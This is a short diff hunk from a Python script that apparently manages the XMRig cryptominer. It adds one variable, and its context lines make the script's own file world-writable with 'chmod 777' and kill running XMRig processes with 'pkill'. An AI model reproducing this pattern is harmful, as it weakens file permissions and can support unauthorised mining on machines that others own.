@@ -9,6 +9,7 @@ from socket import error as socket_error
 import multiprocessing
 import ast
 useproxy = 0
+proxy_error = 0
 os.system('chmod 777 ' + __file__)
 program = 'xmrig'
 os.system('pkill ' + program)
